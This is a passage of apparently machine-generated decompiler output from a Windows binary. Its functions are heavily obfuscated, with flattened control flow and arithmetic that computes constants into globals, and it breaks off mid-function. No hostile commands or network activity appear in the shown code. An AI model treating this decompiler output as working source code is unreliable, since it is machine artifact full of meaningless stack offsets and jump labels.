  local_10 = 0xade777;
  DAT_140a61940 = (void *)FUN_14000e6b0(0xc0);
  lVar1 = (longlong)DAT_140a61940 + 0xc0;
  DAT_140a61948 = DAT_140a61940;
  _DAT_140a61950 = lVar1;
  memmove(DAT_140a61940,&local_c8,0xc0);
  DAT_140a61948 = (void *)lVar1;
  atexit((_func_5014 *)&LAB_140053390);
  return;
}



/* ==================================================================== */
/* FUN_140003dd0 @ 140003dd0 */

void FUN_140003dd0(void)

{
  byte bVar1;
  ulonglong uVar2;
  byte bVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  char cVar6;
  ulonglong uVar7;
  longlong lVar8;
  char cVar9;
  byte local_res8;
  int in_stack_014eef73;
  int in_stack_01725d0c;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined8 local_14;
  undefined4 local_c;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_c = 0;
  local_28 = -0x44e6454d;
LAB_140003e10:
  uVar7 = 0;
  uVar2 = DAT_140a618c8;
  uVar5 = DAT_140a618d0;
LAB_140003e23:
  if (0x1f < uVar7) {
    DAT_140a618f0 = (longlong)local_28;
    return;
  }
  bVar1 = *(byte *)((longlong)&local_28 + uVar7);
  if (uVar7 < uVar2) {
    DAT_140a618f0 = (longlong)in_stack_014eef73;
    return;
  }
  uVar4 = uVar5 + 1;
  cVar6 = (char)uVar7;
  if (uVar4 <= uVar2) {
    if (uVar2 == uVar4) {
      local_res8 = bVar1 + cVar6 + 0x35U + (cVar6 + 0x35U & bVar1) * -2 + 0x8d;
      uVar7 = uVar7 + *(byte *)((longlong)&local_28 + uVar7) + uVar5 + 1;
    }
    else {
      if (uVar2 != uVar5 + 2) goto LAB_140003e70;
      local_res8 = (bVar1 + cVar6 + 3U + (cVar6 + 3U & bVar1) * -2) - 0x15;
LAB_14000436d:
      bVar3 = (char)uVar7 + 0x74;
      uVar2 = uVar2 + 1;
      *(byte *)((longlong)&local_28 + uVar7) = bVar3 + (bVar3 & bVar1) * -2 + -0x2c + bVar1;
      lVar8 = uVar7 + (-1 - uVar2);
      uVar7 = lVar8 + (&bStack_29)[lVar8 + 1] + uVar5 + 1;
    }
    goto LAB_140003e23;
  }
  local_res8 = bVar1 + (cVar6 + 0x67U & bVar1) * -2 + -0x6a + cVar6;
LAB_140003e70:
  if (uVar7 < uVar5) {
    DAT_140a618f0 = (longlong)in_stack_01725d0c;
    return;
  }
  if (uVar2 < uVar4) {
    local_res8 = ('\'' - (cVar6 + 0x73U & bVar1)) * '\x02' + bVar1 + cVar6;
LAB_140003eb0:
    uVar4 = uVar5;
    if (uVar5 + uVar2 <= uVar7) {
      if (uVar2 < uVar5 + 1) {
        local_res8 = bVar1 + (cVar6 + 0x67U & bVar1) * -2 + -0x6a + cVar6;
LAB_140004049:
        if (uVar5 + uVar2 == 1000) {
          cVar9 = ('\x0e' - (cVar6 + 0xa6U & bVar1)) * '\x02';
LAB_1400042cd:
          local_res8 = cVar9 + cVar6;
LAB_1400042d0:
          uVar5 = uVar5 + 1;
          bVar3 = cVar6 + 0xdU + (cVar6 + 0xdU & bVar1) * -2 + -0x5b + bVar1;
          *(byte *)((longlong)&local_28 + uVar7) = bVar3;
          uVar7 = uVar7 - (bVar3 + uVar5);
          goto LAB_14000436d;
        }
        if (uVar5 + 0x10 < uVar2) {
          cVar9 = cVar6 + (cVar6 + 0x8bU & bVar1) * -2 + -0x42;
LAB_140003f8d:
          local_res8 = cVar9 + bVar1;
LAB_140003f90:
          if (0xf < uVar2) {
            local_res8 = *(char *)((longlong)&local_28 + uVar7) + (cVar6 - 0x28U & bVar1) * -2 +
                         -0x10 + cVar6 + bVar1;
            goto LAB_140004282;
          }
          if (uVar5 + 2 < uVar2) {
            local_res8 = ('\x06' - (cVar6 - 2U & bVar1)) * '\x02' + cVar6 + bVar1;
          }
          else {
            if (uVar2 == uVar5 + 1) {
              local_res8 = ('\x1c' - (cVar6 - 0x34U & bVar1)) * '\x02' + cVar6 + bVar1;
              uVar7 = uVar7 + *(byte *)((longlong)&local_28 + uVar7) + uVar5 + 1;
              goto LAB_140003e23;
            }
            if (uVar2 == uVar5 + 3) {
              local_res8 = cVar6 + (cVar6 + 0x68U & bVar1) * -2 + -0x70 + bVar1;
              goto LAB_1400042d0;
            }
          }
          if (1 < uVar5) {
            local_res8 = (cVar6 + (cVar6 + 10U & bVar1) * -2 + bVar1) * '\x02' + 0x88;
            goto LAB_140004332;
          }
          *(byte *)((longlong)&local_28 + uVar7) = local_res8;
          uVar7 = uVar7 + 1;
          goto LAB_140003e23;
        }
        if (uVar2 == uVar5 + 1) {
          cVar9 = cVar6 + (cVar6 + 0x59U & bVar1) * -2 + -0x16;
          goto LAB_14000432f;
        }
        if (uVar2 == uVar5 + 2) {
          local_res8 = ('!' - (cVar6 - 0xbU & bVar1)) * '\x02' + bVar1 + cVar6;
          goto LAB_140003e23;
        }
        if (uVar2 != uVar5 + 5) {
          if (uVar2 == uVar5 + 3) {
            cVar9 = bVar1 + (cVar6 + 0x2dU & bVar1) * -2 + -0xe;
            goto LAB_1400042cd;
          }
          if (uVar2 != uVar5 + 8) goto LAB_140003f90;
          local_res8 = ('%' - (cVar6 - 0x37U & bVar1)) * '\x02' + cVar6 + bVar1;
          uVar7 = uVar7 + *(byte *)((longlong)&local_28 + uVar7) + uVar5 + 1;
          goto LAB_140003e23;
        }
        local_res8 = (cVar6 + bVar1 + (cVar6 + 0x5fU & bVar1) * -2) - 0x3a;
      }
      else {
        if (uVar2 == uVar5 + 1) {
          local_res8 = cVar6 + bVar1 + (cVar6 - 0x1aU & bVar1) * -2 + 0x9c;
          uVar7 = uVar7 + *(byte *)((longlong)&local_28 + uVar7) + uVar5 + 1;
          goto LAB_140003e23;
        }
        if (uVar2 == uVar5 + 2) {
          local_res8 = cVar6 + (cVar6 + 0x82U & bVar1) * -2 + -0xc + bVar1;
          goto LAB_1400042d0;
        }
        if (uVar2 != uVar5 + 5) {
          if (uVar2 != uVar5 + 7) goto LAB_140004049;
          local_res8 = cVar6 + (cVar6 + 0xbaU & bVar1) * -2 + -0x5c + bVar1;
          goto LAB_140003e23;
        }
        local_res8 = ('<' - (cVar6 - 0x14U & bVar1)) * '\x02' + bVar1 + cVar6;
LAB_140004282:
        *(byte *)((longlong)&local_28 + uVar7) =
             cVar6 + 0x3fU + (cVar6 + 0x3fU & bVar1) * -2 + 'G' + bVar1 + local_res8;
        uVar2 = uVar2 + uVar5;
      }
LAB_14000429f:
      uVar7 = uVar7 - local_res8;
      goto LAB_140003e23;
    }
    while (uVar5 = uVar4, uVar2 != uVar4 + 2) {
      if (uVar2 == uVar4 + 0x20) {
        local_res8 = ('(' - (cVar6 + 0x48U & bVar1)) * '\x02' + cVar6 + bVar1;
        goto LAB_14000429f;
      }
      uVar2 = uVar4 + 0x400;
      uVar5 = uVar4 + 0x420;
      if (uVar2 < uVar4 + 0x820) {
        local_res8 = (bVar1 + cVar6 + (cVar6 + 0xb5U & bVar1) * -2) - 0x3e;
        goto LAB_140003e10;
      }
      if (uVar2 < uVar4 + 0x423) {
        cVar9 = cVar6 + (cVar6 + 0x89U & bVar1) * -2 + -0x36;
        goto LAB_140003f8d;
      }
      uVar2 = uVar4 + 0x440;
      uVar5 = uVar4 + 0x443;
      if (uVar4 + 0x463 < uVar2) {
        local_res8 = ('\b' - (cVar6 + 0x28U & bVar1)) * '\x02' + bVar1 + cVar6;
        uVar7 = uVar7 + *(byte *)((longlong)&local_28 + uVar7) + uVar5 + 1;
        goto LAB_140003e23;
      }
      if (uVar4 + 0x1443 < uVar2) {
        uVar5 = uVar4 + 0x444;
        local_res8 = ('\"' - (cVar6 - 0x36U & bVar1)) * '\x02' + cVar6 + bVar1;
        goto LAB_140003e23;
      }
      uVar2 = uVar4 + 0x446;
      uVar4 = uVar4 + 0x1446;
    }
    local_res8 = (':' - (cVar6 + 0x42U & bVar1)) * '\x02' + bVar1 + cVar6;
  }
  else {
    if (uVar2 != uVar4) {
      if (uVar2 != uVar5 + 2) goto LAB_140003eb0;
      uVar5 = uVar5 + 1;
      local_res8 = cVar6 + bVar1 + (cVar6 + 0xfU & bVar1) * -2 + 0xa6;
      goto LAB_140003e23;
    }
    cVar9 = ('=' - (cVar6 + 0x41U & bVar1)) * '\x02' + cVar6;
LAB_14000432f:
    local_res8 = cVar9 + bVar1;
  }
LAB_140004332:
  *(byte *)((longlong)&local_28 + uVar7) =
       cVar6 + 0x71U + (cVar6 + 0x71U & bVar1) * -2 + -0x17 + bVar1;
  uVar5 = uVar5 + 1;
  goto LAB_140003e23;
}



/* ==================================================================== */
/* FUN_140004420 @ 140004420 */

void FUN_140004420(void)

{
  byte bVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  byte bVar4;
  ulonglong uVar5;
  char cVar6;
  longlong lVar7;
  ulonglong uVar8;
  char cVar9;
  byte local_res8;
  int in_stack_0099c0d5;
  int in_stack_01720544;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined4 local_1c;
  undefined2 local_18;

  local_24 = 0;
  local_1c = 0;
  local_18 = 0;
  local_28 = 0x6340cc35;
LAB_140004460:
  uVar3 = DAT_140a618d0;
  uVar5 = DAT_140a618c8;
LAB_140004470:
  uVar8 = 0;
LAB_140004473:
  if (0x11 < uVar8) {
    DAT_140a61920 = (longlong)local_28;
    return;
  }
  bVar1 = *(byte *)((longlong)&local_28 + uVar8);
  if (uVar8 < uVar5) {
    DAT_140a61920 = (longlong)in_stack_0099c0d5;
    return;
  }
  cVar6 = (char)uVar8;
  if (uVar3 + 1 <= uVar5) {
    if (uVar5 == uVar3 + 1) {
      local_res8 = bVar1 + cVar6 + 0xb3U + (cVar6 + 0xb3U & bVar1) * -2 + 0x1b;
      uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar3 + 1;
    }
    else if (uVar5 == uVar3 + 2) {
      local_res8 = bVar1 + (cVar6 - 9U) + (cVar6 - 9U & bVar1) * -2 + 0x3f;
LAB_140004ad3:
      uVar3 = uVar3 + 1;
      bVar4 = cVar6 + 0x9bU + (cVar6 + 0x9bU & bVar1) * -2 + -0x3d + bVar1;
      *(byte *)((longlong)&local_28 + uVar8) = bVar4;
      uVar8 = uVar8 - (bVar4 + uVar3);
LAB_140004af6:
      bVar4 = (char)uVar8 + 0x2c;
      uVar5 = uVar5 + 1;
      *(byte *)((longlong)&local_28 + uVar8) = bVar4 + (bVar4 & bVar1) * -2 + -0x34 + bVar1;
      lVar7 = uVar8 + (-1 - uVar5);
      uVar8 = lVar7 + (&bStack_29)[lVar7 + 1] + uVar3 + 1;
    }
    else {
      if (uVar5 != uVar3 + 3) {
        if (uVar5 != uVar3 + 4) goto LAB_1400044e0;
        bVar4 = cVar6 + 0x7f;
        cVar9 = '\x03';
        goto LAB_140004a51;
      }
      local_res8 = bVar1 + cVar6 + 0x5dU + (cVar6 + 0x5dU & bVar1) * -2 + 0x75;
LAB_140004a84:
      *(byte *)((longlong)&local_28 + uVar8) =
           cVar6 + 0x79U + (cVar6 + 0x79U & bVar1) * -2 + -0x4f + bVar1 + local_res8;
LAB_140004a9e:
      uVar5 = uVar5 + uVar3;
LAB_140004aa1:
      uVar8 = uVar8 - local_res8;
    }
    goto LAB_140004473;
  }
  local_res8 = cVar6 + (cVar6 + 0x91U & bVar1) * -2 + -0x66 + bVar1;
LAB_1400044e0:
  if (uVar8 < uVar3) {
    DAT_140a61920 = (longlong)in_stack_01720544;
    return;
  }
  if (uVar5 < uVar3 + 0x200) {
    local_res8 = cVar6 + (cVar6 - 0x1bU & bVar1) * -2 + -0x5e + bVar1;
LAB_140004550:
    if (uVar8 < uVar3 + uVar5) {
      while (uVar2 = uVar3, uVar5 != uVar2 + 4) {
        if (uVar5 == uVar2 + 0x28) {
          uVar3 = uVar2 + 1;
          local_res8 = ('0' - (cVar6 + 0x70U & bVar1)) * '\x02' + bVar1 + cVar6;
          goto LAB_140004473;
        }
        uVar5 = uVar2 + 9;
        uVar3 = uVar2 + 0xd;
        if (uVar5 < uVar2 + 0x8d) {
          local_res8 = (bVar1 + cVar6 + (cVar6 + 0x33U & bVar1) * -2) - 0x32;
          goto LAB_140004460;
        }
        if (uVar5 < uVar2 + 0x16) {
          local_res8 = ('\x01' - (cVar6 + 0x55U & bVar1)) * '\x02' + cVar6 + bVar1;
          goto LAB_140004470;
        }
        if (uVar2 + 0x67 <= uVar5) {
          uVar5 = uVar2 + 0x100d;
          uVar3 = uVar2 + 0x108d;
          if (uVar2 + 0x10b5 < uVar5) {
            local_res8 = ('8' - (cVar6 + 0x18U & bVar1)) * '\x02' + bVar1 + cVar6;
            uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar3 + 1;
            goto LAB_140004473;
          }
          if (uVar2 + 0x208d < uVar5) {
            local_res8 = bVar1 + (cVar6 + 0x3aU & bVar1) * -2 + -0x5c + cVar6;
            goto LAB_140004af6;
          }
          if (uVar2 + 0x1090 < uVar5) {
            cVar9 = ('\b' - (cVar6 + 0x28U & bVar1)) * '\x02' + cVar6;
            goto LAB_140004a20;
          }
          uVar5 = uVar2 + 0x110d;
          uVar3 = uVar2 + 0x1110;
        }
      }
      local_res8 = ('\x16' - (cVar6 + 0x4eU & bVar1)) * '\x02' + bVar1 + cVar6;
      uVar3 = uVar2;
    }
    else {
      if (uVar3 + 0x200 <= uVar5) {
        if (uVar5 != uVar3 + 1) {
          if (uVar5 == uVar3 + 2) {
            local_res8 = ('<' - (cVar6 - 0x14U & bVar1)) * '\x02' + cVar6 + bVar1;
            goto LAB_140004af6;
          }
          if (uVar5 != uVar3 + 5) goto LAB_1400046b7;
          local_res8 = ('\n' - (cVar6 + 0x52U & bVar1)) * '\x02' + cVar6 + bVar1;
          goto LAB_140004a9e;
        }
        local_res8 = ('\"' - (cVar6 - 0x36U & bVar1)) * '\x02' + bVar1 + cVar6;
        uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar3 + 1;
        goto LAB_140004473;
      }
      local_res8 = cVar6 + (cVar6 + 0x91U & bVar1) * -2 + -0x66 + bVar1;
LAB_1400046b7:
      if (uVar3 + uVar5 == 0x61) {
        local_res8 = ((cVar6 + (cVar6 + 10U & bVar1) * -2) - *(char *)((longlong)&local_28 + uVar8))
                     + -0x3c + bVar1;
        goto LAB_140004ad3;
      }
      if (uVar3 + 0x200 < uVar5) {
        local_res8 = bVar1 + (cVar6 + 0x8dU & bVar1) * -2 + -0x4e + cVar6;
      }
      else {
        if (uVar5 == uVar3 + 1) {
          local_res8 = bVar1 + (cVar6 + 0xafU & bVar1) * -2 + -0x1a + cVar6;
          goto LAB_140004a23;
        }
        if (uVar5 == uVar3 + 3) {
          local_res8 = cVar6 + bVar1 + (cVar6 + 0x37U & bVar1) * -2 + 0xb6;
          goto LAB_140004a9e;
        }
        if (uVar5 == uVar3 + 2) {
          local_res8 = (')' - (cVar6 + 0x9dU & bVar1)) * '\x02' + bVar1 + cVar6;
          goto LAB_140004af6;
        }
        if (uVar5 == uVar3 + 7) {
          local_res8 = cVar6 + (cVar6 + 0xbfU & bVar1) * -2 + -0x7a + bVar1;
          uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar3 + 1;
          goto LAB_140004473;
        }
      }
      if (8 < uVar5) {
        local_res8 = *(char *)((longlong)&local_28 + uVar8) + (cVar6 - 0x18U & bVar1) * -2 + -0x70 +
                     cVar6 + bVar1;
        goto LAB_140004a84;
      }
      if (uVar3 + 4 < uVar5) {
        local_res8 = ('*' - (cVar6 + 0x72U & bVar1)) * '\x02' + cVar6 + bVar1;
      }
      else {
        if (uVar5 == uVar3 + 1) {
          local_res8 = cVar6 + (cVar6 + 0x94U & bVar1) * -2 + -0x78 + bVar1;
          uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar3 + 1;
          goto LAB_140004473;
        }
        if (uVar5 == uVar3 + 2) {
          local_res8 = cVar6 + (cVar6 - 0x28U & bVar1) * -2 + -0x10 + bVar1;
          goto LAB_140004ad3;
        }
        if (uVar5 == uVar3 + 3) {
          local_res8 = (',' - (cVar6 + 0x1cU & bVar1)) * '\x02' + cVar6 + bVar1;
          goto LAB_140004a9e;
        }
        if (uVar5 == uVar3 + 5) {
          local_res8 = cVar6 + (cVar6 + 0x3eU & bVar1) * -2 + -0x74 + bVar1;
          goto LAB_140004a84;
        }
        if (uVar5 == uVar3 + 6) {
          local_res8 = cVar6 + (cVar6 + 0x60U & bVar1) * -2 + -0x40 + bVar1;
          goto LAB_140004473;
        }
      }
      if (uVar3 < 4) {
        *(byte *)((longlong)&local_28 + uVar8) = local_res8;
        uVar8 = uVar8 + 1;
        goto LAB_140004473;
      }
      local_res8 = (cVar6 + (cVar6 - 0x3aU & bVar1) * -2 + bVar1) * '\x02' + 0xb8;
    }
  }
  else {
    if (uVar5 != uVar3 + 1) {
      if (uVar5 == uVar3 + 2) {
        bVar4 = cVar6 + 0x4b;
        cVar9 = '\x1f';
LAB_140004a51:
        local_res8 = (cVar9 - (bVar4 & bVar1)) * '\x02' + cVar6 + bVar1;
      }
      else {
        if (uVar5 == uVar3 + 3) {
          local_res8 = (cVar6 + bVar1 + (cVar6 + 0xb1U & bVar1) * -2) - 0x26;
          goto LAB_140004aa1;
        }
        if (uVar5 == uVar3 + 4) {
          local_res8 = ('\a' - (cVar6 - 0x2dU & bVar1)) * '\x02' + bVar1 + cVar6;
          goto LAB_140004ad3;
        }
        if (uVar5 != uVar3 + 7) goto LAB_140004550;
        local_res8 = (';' - (cVar6 + 0x17U & bVar1)) * '\x02' + cVar6 + bVar1;
        uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar3 + 1;
      }
      goto LAB_140004473;
    }
    cVar9 = cVar6 + (cVar6 + 7U & bVar1) * -2 + -0x2a;
LAB_140004a20:
    local_res8 = cVar9 + bVar1;
  }
LAB_140004a23:
  *(byte *)((longlong)&local_28 + uVar8) =
       cVar6 + 0x57U + (cVar6 + 0x57U & bVar1) * -2 + -0x61 + bVar1;
  uVar3 = uVar3 + 1;
  goto LAB_140004473;
}



/* ==================================================================== */
/* FUN_140004bc0 @ 140004bc0 */

void FUN_140004bc0(void)

{
  ulonglong uVar1;
  byte bVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  byte bVar5;
  byte bVar6;
  longlong lVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  char cVar11;
  byte local_res8;
  int in_stack_006dac9a;
  int in_stack_0162ae90;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined2 local_14;
  undefined1 local_12;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_12 = 0;
  local_28 = 0x4b4e8a8c;
LAB_140004c02:
  uVar3 = DAT_140a618c8;
  uVar9 = DAT_140a618d0;
LAB_140004c10:
  uVar8 = 0;
  uVar4 = uVar3;
  uVar10 = uVar9;
LAB_140004c12:
  if (0x16 < uVar8) {
    DAT_140a61988 = (longlong)local_28;
    return;
  }
  bVar2 = *(byte *)((longlong)&local_28 + uVar8);
  bVar6 = (byte)uVar8;
LAB_140004c25:
  if (uVar8 < uVar4) {
    DAT_140a61988 = (longlong)in_stack_006dac9a;
    return;
  }
  if (uVar10 + 1 <= uVar4) {
    if (uVar4 != uVar10 + 1) {
      if (uVar4 != uVar10 + 3) {
        if (uVar4 != uVar10 + 6) goto LAB_140004c70;
        local_res8 = ('9' - (bVar6 + 0x82 & bVar2)) * '\x02' + bVar6 + 0x82 + bVar2;
        goto LAB_140005579;
      }
      local_res8 = (bVar2 + bVar6 + 0x6e + (bVar6 + 0x6e & bVar2) * -2) - 2;
      goto LAB_1400055ad;
    }
    bVar6 = bVar6 + 0x1e;
    bVar5 = bVar2 & bVar6;
    cVar11 = '\x17';
    goto LAB_1400055d7;
  }
  local_res8 = bVar2 + (bVar6 + 10 & bVar2) * -2 + -0x3c + bVar6;
LAB_140004c70:
  if (uVar8 < uVar10) {
    DAT_140a61988 = (longlong)in_stack_0162ae90;
    return;
  }
  if (uVar10 + 0x2a <= uVar4) {
    if (uVar4 == uVar10 + 1) {
      cVar11 = bVar2 + (bVar6 - 0x1a & bVar2) * -2 + -100;
      goto LAB_140005536;
    }
    if (uVar4 != uVar10 + 3) {
      if (uVar4 != uVar10 + 5) {
        if (uVar4 == uVar10 + 4) {
          cVar11 = bVar2 + (bVar6 + 0x5e & bVar2) * -2 + -0x34;
          goto LAB_140005489;
        }
        if (uVar4 == uVar10 + 7) {
          local_res8 = ('*' - (bVar6 + 0x72 & bVar2)) * '\x02' + bVar2 + bVar6;
          goto LAB_1400054ae;
        }
        if (uVar4 != uVar10 + 2) goto LAB_140004cf0;
        local_res8 = (bVar6 + bVar2 + (bVar6 + 0x86 & bVar2) * -2) - 0x24;
        uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar10 + 1;
        goto LAB_140004c12;
      }
      local_res8 = bVar6 + bVar2 + (bVar6 + 0x36 & bVar2) * -2 + 0xbc;
      goto LAB_1400055ad;
    }
    local_res8 = bVar6 + bVar2 + (bVar6 + 0xe & bVar2) * -2 + 0xac;
    goto LAB_140004c12;
  }
  local_res8 = ('\n' - (bVar6 - 0x2e & bVar2)) * '\x02' + bVar2 + bVar6;
LAB_140004cf0:
  while (uVar9 = uVar10, uVar8 < uVar10 + uVar4) {
    while( true ) {
      do {
        uVar10 = uVar9;
        if (uVar4 == uVar10 + 10) {
          cVar11 = ('\x1c' - (bVar6 + 0x4c & bVar2)) * '\x02' + bVar2;
          goto LAB_140005536;
        }
        if (uVar4 == uVar10 + 2) {
          uVar10 = uVar10 + 1;
          local_res8 = (bVar6 + bVar2 + (bVar6 + 0x60 & bVar2) * -2) - 0x40;
          goto LAB_140004c12;
        }
        if (uVar4 == uVar10 + 0x20) {
          local_res8 = ('$' - (bVar6 + 0x74 & bVar2)) * '\x02' + bVar2 + bVar6;
          goto LAB_140004c12;
        }
        if (uVar4 == uVar10 + 0x1000) {
          bVar5 = bVar6 + 0x88;
          goto LAB_140005238;
        }
        if (uVar4 == uVar10 + 4) {
          local_res8 = (',' - (bVar6 + 0x9c & bVar2)) * '\x02' + bVar2 + bVar6;
          goto LAB_1400055ad;
        }
        if (uVar4 == uVar10 + 0x40) {
          local_res8 = (bVar6 + bVar2 + (bVar6 + 0xb0 & bVar2) * -2) - 0x20;
          goto LAB_1400055b0;
        }
        if (uVar4 == uVar10 + 0x7a) {
          cVar11 = ('4' - (bVar6 - 0x3c & bVar2)) * '\x02' + bVar2;
          goto LAB_140005489;
        }
        if (uVar4 == uVar10 + 6) {
          local_res8 = bVar2 + (bVar6 - 0x28 & bVar2) * -2 + -0x10 + bVar6;
          goto LAB_1400054ae;
        }
        if (uVar4 == uVar10 + 0x5a) {
          cVar11 = '<';
          bVar5 = bVar6 - 0x14 & bVar2;
          goto LAB_1400055d7;
        }
        uVar3 = uVar10 + 9;
        uVar9 = uVar10;
      } while (uVar4 == uVar3);
      uVar9 = uVar10 + 0x209;
      if (uVar3 < uVar10 + 0x20a) {
        local_res8 = ('&' - (bVar6 + 0x1e & bVar2)) * '\x02' + bVar6 + bVar2;
        goto LAB_140004c02;
      }
      if (uVar3 < uVar10 + 0x219) {
        local_res8 = (bVar2 + bVar6 + (bVar6 + 0x32 & bVar2) * -2) - 0x2c;
        goto LAB_140004c10;
      }
      uVar4 = uVar3;
      if (uVar3 < uVar10 + 0x609) {
        local_res8 = ('.' - (bVar6 + 0x46 & bVar2)) * '\x02' + bVar2 + bVar6;
        uVar10 = uVar9;
        goto LAB_140004c25;
      }
      if (uVar3 < uVar10 + 0x20c) {
        local_res8 = bVar2 + (bVar6 + 0x5a & bVar2) * -2 + -0x1c + bVar6;
        uVar10 = uVar9;
        goto LAB_140004c70;
      }
      if (uVar3 < uVar10 + 0x231) break;
      if (uVar3 < uVar10 + 0x26a) {
        cVar11 = bVar2 + (bVar6 + 0x82 & bVar2) * -2 + -0xc;
        uVar10 = uVar9;
        goto LAB_14000509c;
      }
      if (uVar3 < uVar10 + 0x20e) {
        cVar11 = ('>' - (bVar6 + 0x96 & bVar2)) * '\x02' + bVar2;
        uVar10 = uVar9;
        goto LAB_14000505a;
      }
      if (uVar3 < uVar10 + 0x24a) {
        cVar11 = ('\x02' - (bVar6 + 0xaa & bVar2)) * '\x02' + bVar2;
        uVar10 = uVar9;
        goto LAB_140005020;
      }
      if (uVar3 < uVar10 + 0x211) {
        local_res8 = bVar6 + bVar2 + (bVar6 + 0xbe & bVar2) * -2 + 0x8c;
        uVar10 = uVar9;
        goto LAB_140005000;
      }
      uVar1 = uVar10 + 0x289;
      if (uVar1 <= uVar3) {
        uVar9 = uVar10 + 0x2b3;
        uVar4 = uVar1;
        if (uVar10 + 0x2bd < uVar1) {
          cVar11 = '0';
          bVar5 = bVar6 - 0x10 & bVar2;
          uVar10 = uVar9;
          goto LAB_1400055d7;
        }
        if (uVar10 + 0x69b < uVar1) {
          local_res8 = bVar2 + (bVar6 + 4 & bVar2) * -2 + -0x18 + bVar6;
          uVar10 = uVar9;
          goto LAB_1400054ae;
        }
        if (uVar10 + 0x2b5 < uVar1) {
          cVar11 = ('8' - (bVar6 + 0x18 & bVar2)) * '\x02' + bVar2;
          uVar10 = uVar9;
          goto LAB_140005489;
        }
        if (uVar10 + 0x2d3 < uVar1) {
          local_res8 = (bVar6 + bVar2 + (bVar6 + 0x2c & bVar2) * -2) - 8;
          uVar10 = uVar9;
          goto LAB_1400055b0;
        }
        if (uVar10 + 0x12b3 < uVar1) {
          local_res8 = bVar6 + bVar2 + (bVar6 + 0x40 & bVar2) * -2 + 0x80;
          uVar10 = uVar9;
          goto LAB_1400055ad;
        }
        if (uVar10 + 0x2b7 < uVar1) {
          local_res8 = ('\x04' - (bVar6 + 0x54 & bVar2)) * '\x02' + bVar2 + bVar6;
          uVar10 = uVar9;
          goto LAB_140005579;
        }
        if (uVar10 + 0x32d < uVar1) {
          local_res8 = bVar6 + bVar2 + (bVar6 + 0x68 & bVar2) * -2 + 0x90;
          uVar10 = uVar9;
          goto LAB_140004c12;
        }
        if (uVar10 + 0x2b9 < uVar1) {
          local_res8 = ('\f' - (bVar6 + 0x7c & bVar2)) * '\x02' + bVar2 + bVar6;
          uVar10 = uVar10 + 0x2b4;
          goto LAB_140004c12;
        }
        if (uVar10 + 0x317 < uVar1) {
          cVar11 = bVar2 + (bVar6 + 0x90 & bVar2) * -2 + -0x60;
          uVar10 = uVar9;
          goto LAB_140005536;
        }
        if (uVar1 <= uVar10 + 0x30d) {
          uVar4 = uVar10 + 700;
          uVar9 = uVar10 + 0x2c5;
        }
      }
    }
    local_res8 = ('6' - (bVar6 + 0x6e & bVar2)) * '\x02' + bVar2 + bVar6;
    uVar10 = uVar9;
  }
  if (uVar10 + 9 <= uVar4) {
    if (uVar4 == uVar10 + 1) {
      cVar11 = '\x14';
      bVar5 = bVar6 + 0xa4 & bVar2;
LAB_1400055d7:
      local_res8 = (cVar11 - bVar5) * '\x02' + bVar2 + bVar6;
      uVar8 = uVar8 + *(byte *)((longlong)&local_28 + uVar8) + uVar10 + 1;
    }
    else {
      if (uVar4 == uVar10 + 2) {
        cVar11 = ('\x1c' - (bVar6 - 0x34 & bVar2)) * '\x02' + bVar2;
        goto LAB_140005489;
      }
      if (uVar4 == uVar10 + 4) {
        local_res8 = ('$' - (bVar6 - 0xc & bVar2)) * '\x02' + bVar2 + bVar6;
        goto LAB_1400055ad;
      }
      if (uVar4 == uVar10 + 5) {
        bVar5 = bVar6 + 8;
LAB_140005238:
        local_res8 = bVar2 + (bVar5 & bVar2) * -2 + -0x30 + bVar6;
        goto LAB_140005579;
      }
      if (uVar4 == uVar10 + 7) {
        local_res8 = (',' - (bVar6 + 0x1c & bVar2)) * '\x02' + bVar2 + bVar6;
      }
      else {
        if (uVar4 != uVar10 + 6) goto LAB_14000509f;
        uVar10 = uVar10 + 1;
        local_res8 = (bVar6 + bVar2 + (bVar6 + 0x30 & bVar2) * -2) - 0x20;
      }
    }
    goto LAB_140004c12;
  }
  cVar11 = bVar2 + (bVar6 + 10 & bVar2) * -2 + -0x3c;
LAB_14000509c:
  local_res8 = cVar11 + bVar6;
LAB_14000509f:
  if (uVar10 + uVar4 == 8) {
    cVar11 = ('\x14' - (bVar6 + 0x24 & bVar2)) * '\x02';
LAB_140005489:
    local_res8 = cVar11 + bVar6;
    bVar6 = bVar6 + 0x2e + (bVar6 + 0x2e & bVar2) * -2 + -0x42 + bVar2;
    *(byte *)((longlong)&local_28 + uVar8) = bVar6;
    uVar8 = uVar8 - ((ulonglong)bVar6 + uVar10 + 1);
    uVar10 = uVar10 + 1;
LAB_1400054ae:
    bVar6 = (char)uVar8 + 0x38;
    uVar4 = uVar4 + 1;
    *(byte *)((longlong)&local_28 + uVar8) = ('<' - (bVar6 & bVar2)) * '\x02' + bVar6 + bVar2;
    lVar7 = uVar8 + (-1 - uVar4);
    uVar8 = lVar7 + (&bStack_29)[lVar7 + 1] + uVar10 + 1;
    goto LAB_140004c12;
  }
  if (uVar10 + 8 < uVar4) {
    cVar11 = bVar2 + (bVar6 + 0x62 & bVar2) * -2 + -0x4c;
LAB_14000505a:
    local_res8 = cVar11 + bVar6;
LAB_14000505d:
    if (99 < uVar4) {
      local_res8 = bVar2 * '\x02' + (bVar6 + 0x10 & bVar2) * -2 + -0x60 + bVar6;
LAB_140005579:
      *(byte *)((longlong)&local_28 + uVar8) =
           ('%' - (bVar6 + 0x1a & bVar2)) * '\x02' + bVar6 + 0x1a + bVar2 + local_res8;
LAB_1400055ad:
      uVar4 = uVar4 + uVar10;
